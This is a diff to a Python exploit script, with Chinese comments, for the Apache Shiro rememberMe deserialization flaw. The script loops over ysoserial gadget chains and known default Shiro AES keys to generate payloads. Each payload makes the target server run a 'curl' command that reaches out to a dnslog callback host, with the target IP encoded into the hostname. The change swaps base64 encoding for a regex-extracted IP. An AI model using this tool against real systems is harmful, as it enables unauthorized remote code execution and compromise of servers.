@@ -8,6 +8,7 @@ from Crypto.Cipher import AES
 import threading
 from concurrent.futures import ThreadPoolExecutor
 import urllib3
+import re
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 #py3.7
 
@@ -15,6 +16,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # 可以是绝对路径 也可以是相对路径
 #JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-BETA-all.jar'
 JAR_FILE = 'ysoserial.jar'
+
+ip_line_regex = re.compile(r'([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(\/[1-2][0-9])?)')
 
 plugins = ['CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','CommonsCollections8','CommonsCollections9','CommonsCollections10']
 keys = ['kPH+bIxk5D2deZiIxcaaaA==',
@@ -53,8 +56,10 @@ def poc(url):
         return False
     for plugin in plugins:
         for key in keys:
-            en_url = base64.b64encode(target.encode('utf-8')).decode()
-            emae = ('curl http://'+plugin+'.'+key+'.'+en_url+'.')
+            ip = ip_line_regex.search(target).group()
+            #en_ip = base64.b64encode(ip.encode('utf-8')).decode()
+            en_ip = ip.replace('.','_')
+            emae = ('curl http://'+plugin+'.'+key+'.'+en_ip+'.')
             try:
                 payload = generator(JAR_FILE,plugin,key,emae+dnslog)  # 生成payload
                 print(payload.decode())
